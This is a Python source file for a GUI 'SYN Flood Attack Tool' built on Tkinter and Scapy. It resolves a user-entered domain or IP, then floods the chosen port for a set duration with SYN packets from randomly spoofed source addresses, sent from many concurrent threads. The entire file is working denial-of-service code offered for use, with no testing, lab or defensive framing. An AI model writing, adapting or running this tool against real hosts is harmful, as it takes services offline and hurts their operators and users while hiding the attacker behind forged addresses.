import tkinter as tk
from tkinter import messagebox
from scapy.all import *
import random
import time
import threading
import socket  # To resolve domain names to IP addresses

class SYNFloodApp:
    def __init__(self, root):
        self.root = root
        self.root.title("SYN Flood Attack Tool")
        self.root.geometry("400x300")
        
        # Define variables
        self.target_ip = tk.StringVar()
        self.target_port = tk.IntVar()
        self.duration = tk.IntVar()
        self.attack_thread = None
        self.is_attacking = False
        self.packet_count = 0
        
        # Create widgets
        self.create_widgets()

    def create_widgets(self):
        # Target input: IP Address or Domain Name
        tk.Label(self.root, text="Target (IP or Domain)").pack(pady=10)
        self.target_entry = tk.Entry(self.root, textvariable=self.target_ip, width=30)
        self.target_entry.pack(pady=5)
        
        # Port input
        tk.Label(self.root, text="Target Port").pack(pady=10)
        self.port_entry = tk.Entry(self.root, textvariable=self.target_port, width=30)
        self.port_entry.pack(pady=5)

        # Duration input
        tk.Label(self.root, text="Duration (seconds)").pack(pady=10)
        self.duration_entry = tk.Entry(self.root, textvariable=self.duration, width=30)
        self.duration_entry.pack(pady=5)

        # Start button
        self.start_button = tk.Button(self.root, text="Start Attack", command=self.start_attack, width=20)
        self.start_button.pack(pady=10)

        # Stop button
        self.stop_button = tk.Button(self.root, text="Stop Attack", command=self.stop_attack, width=20)
        self.stop_button.pack(pady=5)

        # Output console for logs
        self.console = tk.Text(self.root, height=8, width=50, state=tk.DISABLED)
        self.console.pack(pady=10)

    def start_attack(self):
        # Retrieve input values
        target_input = self.target_ip.get()
        target_port = self.target_port.get()
        duration = self.duration.get()

        if not target_input or not target_port or not duration:
            messagebox.showerror("Input Error", "Please provide valid Target (IP or Domain), Port, and Duration.")
            return
        
        # Resolve target input to IP address if it's a domain name
        try:
            target_ip = self.resolve_target(target_input)
        except socket.gaierror:
            messagebox.showerror("Resolution Error", "Invalid domain name or IP address.")
            return
        
        if self.is_attacking:
            messagebox.showinfo("Info", "Attack is already running!")
            return

        # Start attack in a new thread
        self.is_attacking = True
        self.packet_count = 0
        self.attack_thread = threading.Thread(target=self.syn_flood, args=(target_ip, target_port, duration))
        self.attack_thread.start()

    def stop_attack(self):
        # Stop attack if it's running
        if self.is_attacking:
            self.is_attacking = False
            messagebox.showinfo("Attack Stopped", f"SYN Flood attack stopped after sending {self.packet_count} packets.")
        else:
            messagebox.showinfo("Info", "No attack is running!")

    def syn_flood(self, target_ip, target_port, duration):
        """
        Perform a fast SYN flood attack using multithreading for maximum speed.
        """
        start_time = time.time()
        end_time = start_time + duration

        # Create a list of threads to send packets concurrently
        threads = []
        while time.time() - start_time < duration and self.is_attacking:
            # Use threading to send packets concurrently
            thread = threading.Thread(target=self.send_syn, args=(target_ip, target_port))
            threads.append(thread)
            thread.start()

            # Wait for threads to complete before starting new ones
            if len(threads) > 1000:  # Limit the number of concurrent threads to avoid overloading
                for t in threads:
                    t.join()
                threads.clear()

        # Ensure all threads are finished before ending the attack
        for t in threads:
            t.join()

        self.is_attacking = False

    def send_syn(self, target_ip, target_port):
        """Send a single SYN packet to the target."""
        # Random source IP address
        src_ip = ".".join([str(random.randint(1, 255)) for _ in range(4)])
        
        # Craft the SYN packet
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", seq=random.randint(1000, 9999))

        # Send SYN packet using Ethernet layer (faster)
        sendp(Ether() / ip / tcp, verbose=False)

        # Increment packet count
        self.packet_count += 1

        # Log packets every 100 sent
        if self.packet_count % 100 == 0:
            self.log_output(f"Sent {self.packet_count} SYN packets...")

    def log_output(self, message):
        """Helper function to log output in the GUI."""
        self.console.config(state=tk.NORMAL)
        self.console.insert(tk.END, f"{message}\n")
        self.console.yview(tk.END)
        self.console.config(state=tk.DISABLED)

    def resolve_target(self, target):
        """
        Resolve the target to an IP address. If it's a domain name, resolve it.
        """
        try:
            # Check if it's a valid IP address (IPv4)
            socket.inet_pton(socket.AF_INET, target)
            return target
        except socket.error:
            # If it's not a valid IP, assume it's a domain name
            return socket.gethostbyname(target)

# Create the main application window
root = tk.Tk()

# Initialize the SYN flood attack application
app = SYNFloodApp(root)

# Start the Tkinter main event loop
root.mainloop()
